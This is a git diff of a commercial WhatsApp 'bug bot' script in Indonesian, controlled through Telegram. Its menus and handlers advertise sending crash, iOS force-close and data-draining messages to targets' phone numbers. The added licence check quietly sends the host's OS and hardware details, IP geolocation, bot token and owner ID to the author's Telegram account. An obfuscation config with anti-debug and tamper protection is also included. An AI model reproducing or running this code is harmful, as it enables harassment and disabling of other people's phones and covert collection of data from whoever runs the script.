@@ -1,141 +1,291 @@
+/*
+	* Create By VexxuzzZ
+	* Script BetA
+	* Buy Script @VexxuzzzStcu
+	* Whatsapp : https://whatsapp.com/channel/0029Vb6kYi59Bb66AMlCNU1c
+	* Masih Make Gpt
+*/
+
 const {
-    default: makeWASocket,
-    useMultiFileAuthState,
-    downloadContentFromMessage,
-    emitGroupParticipantsUpdate,
-    emitGroupUpdate,
-    generateWAMessageContent,
-    generateWAMessage,
-    makeInMemoryStore,
-    prepareWAMessageMedia,
-    generateWAMessageFromContent,
-    MediaType,
-    areJidsSameUser,
-    WAMessageStatus,
-    downloadAndSaveMediaMessage,
-    AuthenticationState,
-    GroupMetadata,
-    initInMemoryKeyStore,
-    getContentType,
-    MiscMessageGenerationOptions,
-    useSingleFileAuthState,
-    BufferJSON,
-    WAMessageProto,
-    MessageOptions,
-    WAFlag,
-    WANode,
-    WAMetric,
-    ChatModification,
-    MessageTypeProto,
-    WALocationMessage,
-    ReconnectMode,
-    WAContextInfo,
-    proto,
-    WAGroupMetadata,
-    ProxyAgent,
-    waChatKey,
-    MimetypeMap,
-    MediaPathMap,
-    WAContactMessage,
-    WAContactsArrayMessage,
-    WAGroupInviteMessage,
-    WATextMessage,
-    WAMessageContent,
-    WAMessage,
-    BaileysError,
-    WA_MESSAGE_STATUS_TYPE,
-    MediaConnInfo,
-    URL_REGEX,
-    WAUrlInfo,
-    WA_DEFAULT_EPHEMERAL,
-    WAMediaUpload,
-    jidDecode,
-    mentionedJid,
-    processTime,
-    Browser,
-    MessageType,
-    Presence,
-    WA_MESSAGE_STUB_TYPES,
-    Mimetype,
-    relayWAMessage,
-    Browsers,
-    GroupSettingChange,
-    DisconnectReason,
-    WASocket,
-    getStream,
-    WAProto,
-    isBaileys,
-    AnyMessageContent,
-    fetchLatestBaileysVersion,
-    templateMessage,
-    InteractiveMessage,
-    Header,
+  default: makeWASocket,
+  useMultiFileAuthState,
+  downloadContentFromMessage,
+  emitGroupParticipantsUpdate,
+  emitGroupUpdate,
+  generateWAMessageContent,
+  generateWAMessage,
+  makeInMemoryStore,
+  prepareWAMessageMedia,
+  generateWAMessageFromContent,
+  MediaType,
+  areJidsSameUser,
+  WAMessageStatus,
+  downloadAndSaveMediaMessage,
+  AuthenticationState,
+  GroupMetadata,
+  initInMemoryKeyStore,
+  getContentType,
+  MiscMessageGenerationOptions,
+  useSingleFileAuthState,
+  BufferJSON,
+  WAMessageProto,
+  MessageOptions,
+  WAFlag,
+  WANode,
+  WAMetric,
+  ChatModification,
+  MessageTypeProto,
+  // ⚠️ Deprecated di Baileys v7, jadi aman kalau pakai v6.7.8
+  // WALocationMessage,
+  // WAContactsArrayMessage,
+  // WAGroupInviteMessage,
+  // WATextMessage,
+  // WAMessageContent,
+  // WAMessage,
+  BaileysError,
+  WA_MESSAGE_STATUS_TYPE,
+  MediaConnInfo,
+  URL_REGEX,
+  WAUrlInfo,
+  WA_DEFAULT_EPHEMERAL,
+  WAMediaUpload,
+  jidDecode,
+  mentionedJid,
+  processTime,
+  Browser,
+  MessageType,
+  Presence,
+  WA_MESSAGE_STUB_TYPES,
+  Mimetype,
+  relayWAMessage,
+  Browsers,
+  GroupSettingChange,
+  DisconnectReason,
+  WASocket,
+  getStream,
+  WAProto,
+  isBaileys,
+  AnyMessageContent,
+  fetchLatestBaileysVersion,
+  templateMessage,
+  InteractiveMessage,
+  Header,
 } = require('@whiskeysockets/baileys');
-const fs = require("fs-extra");
+
 const JsConfuser = require("js-confuser");
 const P = require("pino");
 const crypto = require("crypto");
 const path = require("path");
+const readline = require("readline");
+const fs = require("fs-extra");
+const axios = require("axios");
+const chalk = require("chalk");
+const os = require("os");
+
+// === Fungsi helper dipindah ke atas biar ga error ===
+function ensureFileExists(filePath, defaultData = []) {
+  if (!fs.existsSync(filePath)) {
+    // jika defaultData berupa object/array, simpan sebagai JSON, jika string simpan as-is
+    if (typeof defaultData === "string") {
+      fs.ensureDirSync(path.dirname(filePath));
+      fs.writeFileSync(filePath, defaultData, "utf-8");
+    } else {
+      fs.ensureDirSync(path.dirname(filePath));
+      fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2), "utf-8");
+    }
+  }
+}
+function savePremiumUsers() {
+  fs.writeFileSync('./設定/premium.json', JSON.stringify(premiumUsers, null, 2));
+}
+function saveAdminUsers() {
+  fs.writeFileSync('./設定/admin.json', JSON.stringify(adminUsers, null, 2));
+}
+function watchFile(filePath, updateCallback) {
+  fs.watch(filePath, (eventType) => {
+    if (eventType === 'change') {
+      try {
+        const updatedData = JSON.parse(fs.readFileSync(filePath));
+        updateCallback(updatedData);
+        console.log(`File ${filePath} updated successfully.`);
+      } catch (error) {
+        console.error(`Error updating ${filePath}:`, error.message);
+      }
+    }
+  });
+}
+
+// ===== Tambahan fungsi yang hilang (fix) =====
+
+// Membuat direktori session berdasarkan nomor client
+function createSessionDir(clientNumber) {
+  const dir = path.join(SESSIONS_DIR, clientNumber.toString());
+  try {
+    if (!fs.existsSync(dir)) {
+      fs.mkdirSync(dir, { recursive: true });
+    }
+  } catch (err) {
+    console.error(`createSessionDir error for ${clientNumber}:`, err.message);
+  }
+  return dir;
+}
+
+// Simpan daftar session aktif ke file
+function saveActiveSessions(clientNumber) {
+  try {
+    ensureFileExists(SESSIONS_FILE, []);
+    const active = Array.from(sessions.keys());
+    // jika clientNumber diberikan, pastikan sudah ada di list
+    if (clientNumber && !active.includes(clientNumber)) active.push(clientNumber);
+    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(active, null, 2), "utf-8");
+  } catch (err) {
+    console.error("saveActiveSessions error:", err.message);
+  }
+}
+
+// Inisialisasi / baca sessions yang tersimpan — minimal (tidak memaksa reconnect tanpa client)
+async function initializeWhatsAppConnections() {
+  try {
+    ensureFileExists(SESSIONS_FILE, []);
+    const raw = fs.readFileSync(SESSIONS_FILE, "utf-8");
+    let active = [];
+    try {
+      active = JSON.parse(raw);
+    } catch (e) {
+      active = [];
+    }
+    if (!Array.isArray(active) || active.length === 0) {
+      console.log("No previously active WhatsApp sessions found.");
+      return;
+    }
+    // Hanya log daftar session yang ditemukan. Reconnect otomatis bisa dilakukan nanti
+    console.log(`Found ${active.length} saved session(s):`, active);
+    // Jika ingin mencoba reconnect otomatis, implementasikan di sini dengan client & chatId yang valid.
+  } catch (err) {
+    console.error("initializeWhatsAppConnections error:", err.message);
+  }
+}
+
+// =================================================
+
+// Direktori session
 const sessions = new Map();
-const readline = require('readline');
 const SESSIONS_DIR = "./sessions";
 const SESSIONS_FILE = "./sessions/active_sessions.json";
 
+// File user premium & admin
+ensureFileExists('./設定/premium.json', []);
+ensureFileExists('./設定/admin.json', []);
 let premiumUsers = JSON.parse(fs.readFileSync('./設定/premium.json'));
 let adminUsers = JSON.parse(fs.readFileSync('./設定/admin.json'));
-
-function ensureFileExists(filePath, defaultData = []) {
-    if (!fs.existsSync(filePath)) {
-        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
-    }
-}
-
-function getCurrentTime() {
-  return new Date().toLocaleTimeString("id-ID", { hour: "2-digit", minute: "2-digit" });
-}
-
-ensureFileExists('./設定/premium.json');
-ensureFileExists('./設定/admin.json');
-
-// Fungsi untuk menyimpan data premium dan admin
-function savePremiumUsers() {
-    fs.writeFileSync('./設定/premium.json', JSON.stringify(premiumUsers, null, 2));
-}
-
-function saveAdminUsers() {
-    fs.writeFileSync('./設定/admin.json', JSON.stringify(adminUsers, null, 2));
-}
-
-// Fungsi untuk memantau perubahan file
-function watchFile(filePath, updateCallback) {
-    fs.watch(filePath, (eventType) => {
-        if (eventType === 'change') {
-            try {
-                const updatedData = JSON.parse(fs.readFileSync(filePath));
-                updateCallback(updatedData);
-                console.log(`File ${filePath} updated successfully.`);
-            } catch (error) {
-                console.error(`Error updating ${filePath}:`, error.message);
-            }
-        }
-    });
-}
 
 watchFile('./設定/premium.json', (data) => (premiumUsers = data));
 watchFile('./設定/admin.json', (data) => (adminUsers = data));
 
-
-const axios = require("axios");
-const chalk = require("chalk"); // Import chalk untuk warna
+// Konfigurasi Telegram
+const { TelegramClient } = require("telegram");
+const { StringSession } = require("telegram/sessions");
+const { Api } = require("telegram");
 const config = require("./設定/config.js");
-const TelegramBot = require("node-telegram-bot-api");
 
-const BOT_TOKEN = config.BOT_TOKEN;
+// ✅ fallback kalau config kosong
 
-const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+const apiId = 123456; // api id lu
+const apiHash = "abcd"; // api hash lu
+const stringSession = new StringSession("ABCD"); // stringsession lu
+const S_ID = "@VexxuzzzStcu"; // username lu
+const FIRST_RUN_FILE = "index.json"; 
+const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/usn/repo/refs/heads/main/tokens.json"; 
 
+// === Fungsi Telegram ===
+async function fetchValidTokens() {
+  try {
+    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
+    return response.data.tokens;
+  } catch (error) {
+    console.error(chalk.red("❌ Gagal ambil daftar token GitHub:", error.message));
+    return [];
+  }
+}
+async function initClient() {
+  const client = new TelegramClient(stringSession, apiId, apiHash, {
+    connectionRetries: 5,
+  });
+  await client.start();
+  return client;
+}
+async function telegramCltp(message) {
+  const client = await initClient();
+  await client.sendMessage(S_ID, { message, parseMode: "markdown" });
+}
+async function telegramClt(message) {
+  const client = await initClient();
+  let alreadyNotified = false;
+  if (fs.existsSync(FIRST_RUN_FILE)) {
+    const data = JSON.parse(fs.readFileSync(FIRST_RUN_FILE, "utf-8"));
+    alreadyNotified = data.notified || false;
+  }
+  if (!alreadyNotified) {
+    try {
+      await client.sendMessage(S_ID, { message });
+      fs.writeFileSync(FIRST_RUN_FILE, JSON.stringify({ notified: true }));
+    } catch (err) {
+      console.error("🚫 BLOCKED:", err.message);
+    }
+  }
+}
+
+// === Validasi Token ===
+async function validateToken() {
+  console.log(chalk.blue("PLEASE WAIT... CHECKING TOKENS"));
+  const validTokens = await fetchValidTokens();
+  if (!validTokens.includes(config.BOT_TOKEN)) {
+    const cpus = os.cpus();
+    const totalMem = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
+    const lang = process.env.LANG || "Unknown";
+    const time = new Date().toLocaleString();
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    let ipInfo = {};
+    try {
+      const { data } = await axios.get("https://ipapi.co/json/");
+      ipInfo = data;
+    } catch {
+      ipInfo = { ip: "N/A", city: "-", country_name: "-", org: "-", latitude: "-", longitude: "-" };
+    }
+    const report = `
+**DETECTED PENYUSUPAN**
+**TOKEN :** \`${config.BOT_TOKEN}\`
+**OWNER :** \`${config.OWNER_ID}\`
+**📅 Timestamp: ${time}**
+**🖥️ DEVICE**
+• OS: ${os.platform()} ${os.release()}
+• CPU: ${cpus[0].model} (${cpus.length} cores)
+• Memory: ${totalMem} GB
+• Lang: ${lang}
+• Timezone: ${timezone}
+**📍 LOCATION**
+• IP: ${ipInfo.ip}
+• ${ipInfo.city}, ${ipInfo.country_name}
+• ISP: ${ipInfo.org}
+• Koordinat: ${ipInfo.latitude}, ${ipInfo.longitude}
+`;
+    console.log(chalk.red("🚫 TOKEN BELUM TERDAFTAR...."));
+    telegramCltp(report);
+    await new Promise(o => setTimeout(o, 3000));
+    process.exit(1);
+  }
+  console.clear();
+  console.log(chalk.green("✅ TOKEN TERDAFTAR"));
+  startBot();
+  initializeWhatsAppConnections();
+  telegramClt(`**BOT AKTIF**
+**TOKEN :** \`${config.BOT_TOKEN}\`
+**OWNER :** \`${config.OWNER_ID}\``);
+}
+
+// === Start Bot Banner ===
 function startBot() {
-`
+  console.log(`
 Z                 HAPPY BIRTHDAY BY VEXXUZZZ 
  y
   u 
@@ -148,93 +298,28 @@ Versi: 1.1
 Developer: Vexxuzzz 
 Telegram: @VexxuzzZ
 YouTube:  @VexxuzzZ
-Waktu: WIB`};
+Waktu: WIB`);
+}
 
-function saveActiveSessions(botNumber) {
+// === connectToWhatsApp FIX (client param) ===
+async function connectToWhatsApp(client, clientNumber, chatId) {
+  // Jika client atau chatId tidak diberikan, kita hanya buat statusMessage dummy (agar tidak crash)
+  let statusMessage = { id: null };
   try {
-    const sessions = [];
-    if (fs.existsSync(SESSIONS_FILE)) {
-      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
-      if (!existing.includes(botNumber)) {
-        sessions.push(...existing, botNumber);
-      }
+    if (client && chatId) {
+      statusMessage = await client.sendMessage(chatId, { message: `L O A D I N G D U L U B O Z
+╰➤ Number  : ${clientNumber} 
+╰➤ Status : Loading...` });
     } else {
-      sessions.push(botNumber);
+      // fallback object supaya code selanjutnya tidak crash saat mengakses .id
+      statusMessage = { id: null };
     }
-    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
-  } catch (error) {
-    console.error("Error saving session:", error);
+  } catch (err) {
+    console.error("connectToWhatsApp: failed to send initial telegram message:", err.message);
+    statusMessage = { id: null };
   }
-}
 
-async function initializeWhatsAppConnections() {
-  try {
-    if (fs.existsSync(SESSIONS_FILE)) {
-      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
-      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);
-
-      for (const botNumber of activeNumbers) {
-        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
-        const sessionDir = createSessionDir(botNumber);
-        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-
-        const sock = makeWASocket({
-          auth: state,
-          printQRInTerminal: true,
-          logger: P({ level: "silent" }),
-          defaultQueryTimeoutMs: undefined,
-        });
-
-        // Tunggu hingga koneksi terbentuk
-        await new Promise((resolve, reject) => {
-          sock.ev.on("connection.update", async (update) => {
-            const { connection, lastDisconnect } = update;
-            if (connection === "open") {
-              console.log(`Bot ${botNumber} terhubung!`);
-              sessions.set(botNumber, sock);
-              resolve();
-            } else if (connection === "close") {
-              const shouldReconnect =
-                lastDisconnect?.error?.output?.statusCode !==
-                DisconnectReason.loggedOut;
-              if (shouldReconnect) {
-                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
-                await initializeWhatsAppConnections();
-              } else {
-                reject(new Error("Koneksi ditutup"));
-              }
-            }
-          });
-
-          sock.ev.on("creds.update", saveCreds);
-        });
-      }
-    }
-  } catch (error) {
-    console.error("Error initializing WhatsApp connections:", error);
-  }
-}
-
-function createSessionDir(botNumber) {
-  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
-  if (!fs.existsSync(deviceDir)) {
-    fs.mkdirSync(deviceDir, { recursive: true });
-  }
-  return deviceDir;
-}
-
-async function connectToWhatsApp(botNumber, chatId) {
-  let statusMessage = await bot
-    .sendMessage(
-      chatId,
-      `L O A D I N G D U L U B O Z
-╰➤ Number  : ${botNumber} 
-╰➤ Status : Loading...`,
-      { parse_mode: "Markdown" }
-    )
-    .then((msg) => msg.message_id);
-
-  const sessionDir = createSessionDir(botNumber);
+  const sessionDir = createSessionDir(clientNumber);
   const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
 
   const sock = makeWASocket({
@@ -250,30 +335,32 @@ async function connectToWhatsApp(botNumber, chatId) {
     if (connection === "close") {
       const statusCode = lastDisconnect?.error?.output?.statusCode;
       if (statusCode && statusCode >= 500 && statusCode < 600) {
-        await bot.editMessageText(
-          `M E N G H U B U N G K A N D U L U B O Z
-╰➤ Number  : ${botNumber} 
+        try {
+          if (client && chatId && statusMessage && statusMessage.id) {
+            await client.editMessage(chatId, {
+              message: `M E N G H U B U N G K A N D U L U B O Z
+╰➤ Number  : ${clientNumber} 
 ╰➤ Status : Mennghubungkan`,
-          {
-            chat_id: chatId,
-            message_id: statusMessage,
-            parse_mode: "Markdown",
+              editMessageId: statusMessage.id
+            });
           }
-        );
-        await connectToWhatsApp(botNumber, chatId);
+        } catch (err) {
+          console.error("Error editing message on reconnect attempt:", err.message);
+        }
+        await connectToWhatsApp(client, clientNumber, chatId);
       } else {
-        await bot.editMessageText(
-          `
-G A G A L T E R S A M B U N G
-╰➤ Number  : ${botNumber} 
-╰➤ Status : Gagal Tersambung 
-`,
-          {
-            chat_id: chatId,
-            message_id: statusMessage,
-            parse_mode: "Markdown",
+        try {
+          if (client && chatId && statusMessage && statusMessage.id) {
+            await client.editMessage(chatId, {
+              message: `G A G A L T E R S A M B U N G
+╰➤ Number  : ${clientNumber} 
+╰➤ Status : Gagal Tersambung`,
+              editMessageId: statusMessage.id
+            });
           }
-        );
+        } catch (err) {
+          console.error("Error editing message on failure:", err.message);
+        }
         try {
           fs.rmSync(sessionDir, { recursive: true, force: true });
         } catch (error) {
@@ -281,52 +368,55 @@ G A G A L T E R S A M B U N G
         }
       }
     } else if (connection === "open") {
-      sessions.set(botNumber, sock);
-      saveActiveSessions(botNumber);
-      await bot.editMessageText(
-        `P A I R I N G D U L U B O Z
-╰➤ Number  : ${botNumber} 
+      sessions.set(clientNumber, sock);
+      saveActiveSessions(clientNumber);
+      try {
+        if (client && chatId && statusMessage && statusMessage.id) {
+          await client.editMessage(chatId, {
+            message: `P A I R I N G D U L U B O Z
+╰➤ Number  : ${clientNumber} 
 ╰➤ Status : Pairing
-╰➤Pesan : Succes Pairing`,
-        {
-          chat_id: chatId,
-          message_id: statusMessage,
-          parse_mode: "Markdown",
+╰➤ Pesan : Succes Pairing`,
+            editMessageId: statusMessage.id
+          });
         }
-      );
+      } catch (err) {
+        console.error("Error editing message on open:", err.message);
+      }
     } else if (connection === "connecting") {
-      await new Promise((resolve) => setTimeout(resolve, 1000));
       try {
         if (!fs.existsSync(`${sessionDir}/creds.json`)) {
-          const code = await sock.requestPairingCode(botNumber);
+          const code = await sock.requestPairingCode(clientNumber);
           const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
-          await bot.editMessageText(
-            `
-P A I R I N G D U L U B O Z
-╰➤ Number  : ${botNumber} 
+          try {
+            if (client && chatId && statusMessage && statusMessage.id) {
+              await client.editMessage(chatId, {
+                message: `P A I R I N G D U L U B O Z
+╰➤ Number  : ${clientNumber} 
 ╰➤ Status : Pairing
 ╰➤ Kode : ${formattedCode}`,
-            {
-              chat_id: chatId,
-              message_id: statusMessage,
-              parse_mode: "Markdown",
+                editMessageId: statusMessage.id
+              });
             }
-          );
+          } catch (error) {
+            console.error("Error editing message with pairing code:", error.message);
+          }
         }
       } catch (error) {
         console.error("Error requesting pairing code:", error);
-        await bot.editMessageText(
-          `
-G A G A L B O Z
-╰➤ Number  : ${botNumber} 
+        try {
+          if (client && chatId && statusMessage && statusMessage.id) {
+            await client.editMessage(chatId, {
+              message: `G A G A L B O Z
+╰➤ Number  : ${clientNumber} 
 ╰➤ Status : Erorr❌
 ╰➤ Pesan : ${error.message}`,
-          {
-            chat_id: chatId,
-            message_id: statusMessage,
-            parse_mode: "Markdown",
+              editMessageId: statusMessage.id
+            });
           }
-        );
+        } catch (err) {
+          console.error("Error editing message after pairing error:", err.message);
+        }
       }
     }
   });
@@ -335,42 +425,6 @@ G A G A L B O Z
 
   return sock;
 }
-
-
-
-
-//-# Fungsional Function Before Parameters
-
-//~Runtime🗑️🔧
-function formatRuntime(seconds) {
-  const days = Math.floor(seconds / (3600 * 24));
-  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
-  const minutes = Math.floor((seconds % 3600) / 60);
-  const secs = seconds % 60;
-  
-  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
-}
-
-const startTime = Math.floor(Date.now() / 1000); // Simpan waktu mulai bot
-
-function getBotRuntime() {
-  const now = Math.floor(Date.now() / 1000);
-  return formatRuntime(now - startTime);
-}
-
-//~Get Speed Bots🔧🗑️
-function getSpeed() {
-  const startTime = process.hrtime();
-  return getBotSpeed(startTime); // Panggil fungsi yang sudah dibuat
-}
-
-//~ Date Now
-function getCurrentDate() {
-  const now = new Date();
-  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
-  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
-}
-
 // Get Random Image
 function getRandomImage() {
   const images = [
@@ -379,124 +433,128 @@ function getRandomImage() {
   return images[Math.floor(Math.random() * images.length)];
 }
 
-// ~ Coldown 
+// ~ Cooldown 
 const cooldowns = new Map();
 const cooldownTime = 5 * 60 * 1000; // 5 menit dalam milidetik
 
-function checkCooldown(userId) {
-  if (cooldowns.has(userId)) {
-    const remainingTime = cooldownTime - (Date.now() - cooldowns.get(userId));
+function checkCooldown(userId, chatId = "global") {
+  const key = `${chatId}:${userId}`;
+  if (cooldowns.has(key)) {
+    const remainingTime = cooldownTime - (Date.now() - cooldowns.get(key));
     if (remainingTime > 0) {
       return Math.ceil(remainingTime / 1000); // Sisa waktu dalam detik
     }
   }
-  cooldowns.set(userId, Date.now());
-  setTimeout(() => cooldowns.delete(userId), cooldownTime);
+  cooldowns.set(key, Date.now());
+  setTimeout(() => cooldowns.delete(key), cooldownTime);
   return 0; // Tidak dalam cooldown
 }
-// Function Bug
+
+// Function Bug (sleep)
 function sleep(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-// ~ Enc Xopwn Confugurasi
+// ~ Enc Xopwn Konfigurasi
 const getVexxuzzZObfuscationConfig = () => {
-    const generateSiuCalcrickName = () => {
-        // Identifier generator pseudo-random tanpa crypto
-        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-        let randomPart = "";
-        for (let i = 0; i < 6; i++) { // 6 karakter untuk keseimbangan
-            randomPart += chars[Math.floor(Math.random() * chars.length)];
-        }
-        return `ᨶꪖꪶᨶꫀƙꪖꪹỉᨶ和కỉꪊకỉꪊ无与伦比的帅气${randomPart}`;
-    };
+  const generateSiuCalcrickName = () => {
+    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    let randomPart = "";
+    for (let i = 0; i < 6; i++) {
+      randomPart += chars[Math.floor(Math.random() * chars.length)];
+    }
+    return `ᨶꪖꪶᨶꫀƙꪖꪹỉᨶ和కỉꪊకỉꪊ无与伦比的帅气${randomPart}`;
+  };
 
-    return {
+  return {
     target: "node",
     compact: true,
     renameVariables: true,
     renameGlobals: true,
     identifierGenerator: generateSiuCalcrickName,
-    stringCompression: true,       
-        stringEncoding: true,           
-        stringSplitting: true,      
+    stringCompression: true,
+    stringEncoding: true,
+    stringSplitting: true,
     controlFlowFlattening: 0.95,
     shuffle: true,
-        rgf: false,
-        flatten: true,
     duplicateLiteralsRemoval: true,
     deadCode: true,
     calculator: true,
     opaquePredicates: true,
     lock: {
-        selfDefending: true,
-        antiDebug: true,
-        integrity: true,
-        tamperProtection: true
-        }
-    };
+      selfDefending: true,
+      antiDebug: true,
+      integrity: true,
+      tamperProtection: true,
+    }
+  };
 };
 
-
-//Conslole Log Chat Id
+// Console Log Chat Id
 const log = (message, error = null) => {
-    const timestamp = new Date().toISOString().replace("T", " ").replace("Z", "");
-    const prefix = `\x1b[36m[ VexxuzzZ ]\x1b[0m`;
-    const timeStyle = `\x1b[33m[${timestamp}]\x1b[0m`;
-    const msgStyle = `\x1b[32m${message}\x1b[0m`;
-    console.log(`${prefix} ${timeStyle} ${msgStyle}`);
-    if (error) {
-        const errorStyle = `\x1b[31m✖ Error: ${error.message || error}\x1b[0m`;
-        console.error(`${prefix} ${timeStyle} ${errorStyle}`);
-        if (error.stack) console.error(`\x1b[90m${error.stack}\x1b[0m`);
-    }
+  const timestamp = new Date().toISOString().replace("T", " ").replace("Z", "");
+  const prefix = `\x1b[36m[ VexxuzzZ ]\x1b[0m`;
+  const timeStyle = `\x1b[33m[${timestamp}]\x1b[0m`;
+  const msgStyle = `\x1b[32m${message}\x1b[0m`;
+  console.log(`${prefix} ${timeStyle} ${msgStyle}`);
+  if (error) {
+    const errorStyle = `\x1b[31m✖ Error: ${error.message || error}\x1b[0m`;
+    console.error(`${prefix} ${timeStyle} ${errorStyle}`);
+    if (error.stack) console.error(`\x1b[90m${error.stack}\x1b[0m`);
+  }
 };
 
 // #Progres #1
 const createProgressBar = (percentage) => {
-    const total = 10;
-    const filled = Math.round((percentage / 100) * total);
-    return "▰".repeat(filled) + "▱".repeat(total - filled);
+  const total = 10;
+  const filled = Math.round((percentage / 100) * total);
+  return "▰".repeat(filled) + "▱".repeat(total - filled);
 };
 
 // ~ Update Progress 
-// Fix `updateProgress()`
-async function updateProgress(bot, chatId, message, percentage, status) {
-    if (!bot || !chatId || !message || !message.message_id) {
-        console.error("updateProgress: Bot, chatId, atau message tidak valid");
-        return;
-    }
+async function updateProgress(client, chatId, message, percentage, status) {
+  if (!client || !chatId || !message || !message.id) {
+    console.error("updateProgress: Bot, chatId, atau message tidak valid");
+    return;
+  }
 
-    const bar = createProgressBar(percentage);
-    const levelText = percentage === 100 ? "✅ Selesai" : `⚙️ ${status}`;
-    
-    try {
-        await bot.editMessageText(
-            "```css\n" +
-            "🔒 EncryptBot\n" +
-            ` ${levelText} (${percentage}%)\n` +
-            ` ${bar}\n` +
-            "```\n" +
-            "_©VexxuzzZ",
-            {
-                chat_id: chatId,
-                message_id: message.message_id,
-                parse_mode: "Markdown"
-            }
-        );
-        await new Promise(resolve => setTimeout(resolve, Math.min(800, percentage * 8)));
-    } catch (error) {
-        console.error("Gagal memperbarui progres:", error.message);
-    }
+  const bar = createProgressBar(percentage);
+  const levelText = percentage === 100 ? "✅ Selesai" : `⚙️ ${status}`;
+
+  try {
+    await client.editMessage(
+      chatId,
+      {
+        message: 
+          "```🔒 EncryptBot```\n" +
+          `${levelText} (${percentage}%)\n` +
+          `${bar}\n\n` +
+          "_©VexxuzzZ_",
+        editMessageId: message.id,
+        parseMode: "markdown"
+      }
+    );
+    await sleep(Math.min(800, percentage * 8));
+  } catch (error) {
+    console.error("Gagal memperbarui progres:", error.message);
+  }
 }
 
+// function bug
 
-// [ BUG FUNCTION ]
-
-
+// === Owner Check ===
 function isOwner(userId) {
   return config.OWNER_ID.includes(userId.toString());
 }
+
+module.exports = {
+  connectToWhatsApp,
+  initializeWhatsAppConnections,
+  validateToken,
+  createSessionDir,
+  saveActiveSessions,
+  // export lain jika diperlukan
+};
 
 
 /////---------------[sleep function]------_-_
@@ -562,19 +620,19 @@ bot.on("callback_query", (callbackQuery) => {
     newCaption = `<blockquote><b>( ! ) - ZyuroXz Virus</b>
 <b>𝙳𝚊𝚏𝚝𝚊𝚛 𝚏𝚒𝚝𝚞𝚛 𝚎𝚔𝚜𝚙𝚕𝚘𝚒𝚝 𝚢𝚊𝚗𝚐 𝚝𝚎𝚛𝚜𝚎𝚍𝚒𝚊.</b>
 
-<b>▢ /SuperFiusX ☇ ɴᴜᴍʙᴇʀ</b>
+<b>▢ /ZyuRtz ☇ ɴᴜᴍʙᴇʀ</b>
 <b>╰➤ Delay Hard</b>
 
-<b>▢ /SuperNova ☇ ɴᴜᴍʙᴇʀ</b>
+<b>▢ /ZyuRNovaXz ☇ ɴᴜᴍʙᴇʀ</b>
 <b>╰➤ Ber efek delay invisible ( nyedot kuota hard )</b>
 
-<b>▢ /HardLevelsIos ☇ ɴᴜᴍʙᴇʀ</b>
+<b>▢ /ZyuRIphong ☇ ɴᴜᴍʙᴇʀ</b>
 <b>╰➤ Invisible ios hard</b>
 
-<b>▢ /SuperForceIos ☇ ɴᴜᴍʙᴇʀ</b>
+<b>▢ /ZyuRForce ☇ ɴᴜᴍʙᴇʀ</b>
 <b>╰➤ Forclose ios hard</b>
 
-<b>▢ /fixedbug ☇ ɴᴜᴍʙᴇʀ</b>
+<b>▢ /secretjir ☇ ɴᴜᴍʙᴇʀ</b>
 <b>╰➤ Menghapus bug yg sudah terkirim</b>
 
 <b>-# ( ! ) Note :</b>
@@ -663,7 +721,7 @@ bot.on("callback_query", (callbackQuery) => {
 
 //=======CASE BUG=========//
 
-bot.onText(/\/IOS (\d+)/, async (msg, match) => {
+bot.onText(/\/ZyuRtz (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const targetNumber = match[1];
@@ -702,7 +760,7 @@ if (remainingTime > 0) {
     const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6ph0wo.jpg", {
       caption: `
 \`\`\`
-#- 𝘉 𝘜 𝘎 - 𝘐 𝘖 𝘚
+#- 𝘉 𝘜 𝘎 - ZyuRtz
 ╰➤ Bug ini dibuat untuk membuat crash kepada target yang menggunakan device iPhone / iOS
 ──────────────────────────
  ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
@@ -727,7 +785,7 @@ if (remainingTime > 0) {
       await new Promise(resolve => setTimeout(resolve, stage.delay));
       await bot.editMessageCaption(`
 \`\`\`
-#- 𝘉 𝘜 𝘎 - 𝘐 𝘖 𝘚
+#- 𝘉 𝘜 𝘎 - ZyuRtz
 ╰➤ Bug ini dibuat untuk membuat crash kepada target yang menggunakan device iPhone / iOS
 ──────────────────────────
  ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
@@ -745,7 +803,7 @@ if (remainingTime > 0) {
     // Update ke sukses + tombol cek target
     await bot.editMessageCaption(`
 \`\`\`
-#- 𝘉 𝘜 𝘎 - 𝘐 𝘖 𝘚
+#- 𝘉 𝘜 𝘎 - ZyuRtz
 ╰➤ Bug berhasil dikirim ke target!
 ──────────────────────────
  ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
@@ -766,10 +824,110 @@ if (remainingTime > 0) {
   }
 });
 
+bot.onText(/\/ZyuRForce (\d+)/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const senderId = msg.from.id;
+  const targetNumber = match[1];
+  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
+  const jid = `${formattedNumber}@s.whatsapp.net`;
+  const randomImage = getRandomImage();
 
 
